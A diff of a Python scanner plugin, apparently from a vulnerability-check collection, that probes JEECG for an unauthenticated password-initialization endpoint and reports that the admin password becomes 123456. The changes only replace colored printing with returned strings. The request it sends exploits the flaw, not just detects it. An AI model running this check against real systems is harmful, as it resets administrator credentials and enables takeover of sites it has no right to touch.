@@ -8,8 +8,8 @@ description: 未授权可访问初始化方法重置。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class jeecg_pwd_reset_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class jeecg_pwd_reset_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"loginController.do?pwdInit" in req.text:
-                cprint("[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl+"\tadmin:123456", "red")
+                return "[+]存在jeecg 重置admin密码漏洞...(高危)\tpayload: "+vulnurl+"\tadmin:123456"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = jeecg_pwd_reset_BaseVerify(sys.argv[1])
     testVuln.run()
